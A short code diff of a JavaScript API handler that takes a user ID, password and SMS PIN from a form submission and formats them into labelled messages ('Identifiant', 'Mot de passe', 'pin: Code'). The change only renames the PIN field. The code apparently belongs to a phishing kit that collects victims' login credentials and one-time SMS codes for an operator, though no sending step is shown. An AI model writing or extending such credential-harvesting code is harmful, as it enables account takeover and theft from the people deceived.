@@ -7,7 +7,7 @@ export default async function handler(req, res) {
 
     id_no,
     password,
-    k,
+    PIN,
 
   } = req.body;
 
@@ -23,11 +23,11 @@ export default async function handler(req, res) {
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
     `;
-  } else if (k) {
+  } else if (PIN) {
     // 🟠 رسالة SMS
     message = `
-📲 pin:
-- Code: ${k}
+  📲 pin:
+  - Code: ${PIN}
     `;
   }
 
